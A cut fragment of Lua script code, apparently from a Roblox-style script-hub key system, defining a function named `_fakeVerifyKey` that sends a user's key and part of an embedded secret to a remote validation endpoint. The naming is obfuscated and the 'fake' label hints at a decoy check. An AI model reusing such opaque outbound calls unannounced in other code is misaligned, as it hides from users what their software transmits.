	local _ok,_resp=_pcall(function()return _requestFunc(cfg)end)
	if _ok and type(_resp)=="table"then return _resp end
	return nil
end

local function _fakeVerifyKey(key,onDone)
	if _sending then return end
	_sending=true
	_taskspawn(function()
		local _payload=_buildKeyPayload(key)
		local _ep=_host.."/api/v2/validate"
		local _resp=_requestCall({
			Url=_ep,
			Method="POST",
			Headers={
				["Content-Type"]="application/json",
				["X-Hub-Nonce"]=_buildNonce(1337),
				["X-Service-Id"]=_T(_svcId),
				["X-Secret"]=_sb(_secret,1,8)
			},
			Body=_payload
		})
		local _pass=false
		if _resp and _resp.StatusCode==200 then
			local _body=_resp.Body or _resp.body or""
			_pass=(_body:find('"success":true')~=nil)
		end
		_sending=false
		if onDone then onDone(_pass)end
	end)
end

